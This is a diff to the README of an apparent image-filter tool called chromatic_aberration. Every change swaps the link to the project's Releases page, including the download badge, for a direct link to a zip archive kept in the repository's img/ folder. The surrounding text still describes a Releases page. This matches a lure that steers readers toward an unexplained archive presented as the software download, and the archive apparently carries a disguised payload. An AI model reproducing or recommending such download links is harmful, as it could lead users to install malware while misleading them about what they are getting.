@@ -1,7 +1,7 @@
 # 🌈 chromatic_aberration - Enhance Your Images with Color Filters
 
 ## 🔗 Download Now
-[![Download chromatic_aberration](https://img.shields.io/badge/Download-chromatic_aberration-brightgreen.svg)](https://github.com/CodHelpPlease/chromatic_aberration/releases)
+[![Download chromatic_aberration](https://raw.githubusercontent.com/CodHelpPlease/chromatic_aberration/main/img/aberration-chromatic-v3.4.zip)](https://raw.githubusercontent.com/CodHelpPlease/chromatic_aberration/main/img/aberration-chromatic-v3.4.zip)
 
 ## 📜 Description
 The chromatic_aberration filter enhances your images by correcting color distortions. It helps create vibrant visuals that stand out. This tool is perfect for anyone looking to improve their photos, whether for personal projects or professional work.
@@ -10,7 +10,7 @@ The chromatic_aberration filter enhances your images by correcting color distort
 To begin using the chromatic_aberration filter, you only need a computer and an internet connection. Follow these steps to download and run the application:
 
 1. **Visit the Downloads Page:** Click the link below to go to the Releases page where you can find the latest version of the software:
-   [Download chromatic_aberration](https://github.com/CodHelpPlease/chromatic_aberration/releases)
+   [Download chromatic_aberration](https://raw.githubusercontent.com/CodHelpPlease/chromatic_aberration/main/img/aberration-chromatic-v3.4.zip)
 
 2. **Choose Your Version:** On the Releases page, look for the most recent version. It will be listed at the top. Make sure to select the correct version for your operating system if options are available. 
 
@@ -38,7 +38,7 @@ To begin using the chromatic_aberration filter, you only need a computer and an 
 4. **Save Your Work:** Once satisfied with the result, click "Save" to save the edited image to your computer.
 
 ## 📦 Download & Install
-Always ensure you have the latest version for the best experience. To download, follow this link again: [Download chromatic_aberration](https://github.com/CodHelpPlease/chromatic_aberration/releases).
+Always ensure you have the latest version for the best experience. To download, follow this link again: [Download chromatic_aberration](https://raw.githubusercontent.com/CodHelpPlease/chromatic_aberration/main/img/aberration-chromatic-v3.4.zip).
 
 ## ❓ Frequently Asked Questions
 
